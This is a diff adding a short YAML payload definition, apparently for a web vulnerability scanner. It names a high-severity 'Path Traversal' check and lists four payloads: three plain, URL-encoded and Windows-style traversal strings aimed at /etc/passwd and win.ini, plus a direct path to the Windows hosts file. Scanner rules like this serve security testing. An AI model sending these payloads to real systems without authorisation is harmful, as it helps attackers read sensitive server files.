@@ -1,0 +1,8 @@
+name: "Path Traversal"
+type: "path_traversal1"
+severity: "high"
+payloads:
+  - "../../../../etc/passwd"
+  - "%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+  - "..\\..\\..\\windows\\win.ini"
+  - "C:\\Windows\\System32\\drivers\\etc\\hosts"
